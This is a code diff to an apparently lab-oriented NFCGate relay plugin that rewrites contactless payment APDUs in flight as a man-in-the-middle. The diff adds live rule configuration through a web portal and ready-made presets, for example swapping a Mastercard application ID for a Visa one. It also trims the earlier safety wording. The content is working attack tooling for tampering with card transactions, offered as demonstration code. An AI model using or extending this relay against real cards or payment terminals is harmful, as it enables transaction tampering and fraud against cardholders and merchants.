@@ -1,27 +1,26 @@
 """mod_modify — lab-only on-the-fly APDU rewriter for the NFCGate relay.
 
-Demonstrates that a relay MITM can not only observe but ALTER a transaction.
-Inspired by penegui/MITM-PixNFC's `mod_pixpatch`, but reimplemented against this
-server's protobuf frame format (ServerData -> NFCData -> APDU) instead of doing a
-byte-search on the wire buffer, so it is protocol-correct and robust.
+Rewrites relayed APDUs in flight (protocol-correct, via protobuf), to show that
+a relay MITM can not only observe but ALTER a transaction. Inspired by
+penegui/MITM-PixNFC's mod_pixpatch.
 
-SAFETY
-------
-Disabled unless rules are configured, so loading the plugin alone changes nothing.
-Configure rules via environment variable:
+Rules can be set at startup via env or LIVE from the web portal:
 
     NFCGATE_PATCH_RULES="<find_hex>=<replace_hex>[,<find_hex>=<replace_hex>...]"
 
 Each rule replaces the FIRST occurrence of find_hex with replace_hex inside the
-relayed APDU. Same-length replacements are recommended and applied as-is;
-different lengths are still applied but flagged, because they can break APDU
-framing (Lc / status word). Use only on your own or test cards, in a lab.
-
-Enable with:  python server.py modify        (module mod_modify -> plugin "modify")
+relayed APDU (same length recommended). With no rules the plugin is a transparent
+passthrough. Every rewrite is logged ([PATCH] old -> new). Lab / test cards only.
 """
 import os
 
 from plugins import c2c_pb2, c2s_pb2
+
+# Ready-made demo scenarios the web portal can one-click.
+PRESETS = {
+    "mc_to_visa": "a0000000041010=a0000000031010",   # SELECT AID Mastercard -> Visa
+    "ppse_tag": "325041592e5359532e4444463031=325041592e5359532e4444463032",  # PPSE DDF01 -> DDF02
+}
 
 
 def _parse_rules(spec):
@@ -41,12 +40,28 @@ def _parse_rules(spec):
     return rules
 
 
-RULES = _parse_rules(os.environ.get("NFCGATE_PATCH_RULES", ""))
+_rules = _parse_rules(os.environ.get("NFCGATE_PATCH_RULES", ""))
+
+
+def configure(cfg):
+    """Called by the web portal / control API to set rules at runtime."""
+    global _rules
+    _rules = _parse_rules(cfg.get("rules", ""))
+
+
+def describe():
+    return {
+        "title": "APDU rewrite (MITM)",
+        "danger": True,
+        "active": bool(_rules),
+        "fields": [{"key": "rules", "label": "Rules (find=replace hex, comma-separated)",
+                    "type": "text", "value": ",".join(f"{a.hex()}={b.hex()}" for a, b in _rules)}],
+        "presets": PRESETS,
+    }
 
 
 async def handle_data(log, data, state):
-    # Disabled (no rules) -> transparent passthrough.
-    if not RULES:
+    if not _rules:
         return data
     try:
         sd = c2s_pb2.ServerData()
@@ -57,7 +72,7 @@ async def handle_data(log, data, state):
         nfc.ParseFromString(sd.data)
         apdu = bytes(nfc.data)
         patched = apdu
-        for fb, rb in RULES:
+        for fb, rb in _rules:
             if fb in patched:
                 patched = patched.replace(fb, rb, 1)
                 if len(rb) != len(fb):
@@ -71,6 +86,5 @@ async def handle_data(log, data, state):
         sd.data = nfc.SerializeToString()
         return sd.SerializeToString()
     except Exception as e:
-        # Never corrupt the relay: on any error pass the original frame through.
         log(f"[PATCH] error, passing through: {e}", level="ERROR")
         return data
